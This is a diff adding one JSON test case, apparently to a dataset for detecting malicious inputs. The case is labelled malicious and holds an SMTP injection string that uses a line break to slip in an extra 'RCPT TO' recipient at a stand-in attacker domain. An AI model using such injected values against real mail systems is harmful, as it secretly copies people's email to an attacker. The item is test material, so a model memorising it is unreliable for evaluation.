@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::122::paraphrase-variations::3",
+  "base_sample_id": "exp::email-webfetch::122",
+  "generator_id": "paraphrase-variations",
+  "generator_version": "1.0.0",
+  "seed": 165244542,
+  "content": "RCPT TO: <victim@target.example.com>\r\nRCPT (in accordance with the protocol) TO: <spy@evil.example.com>\n",
+  "content_hash": "f7f55c8a5202aada890caf860c0e573c2dd9795c1972394fd6b0b4464358d430",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "paraphrase:jargon",
+  "difficulty": "moderate"
+}
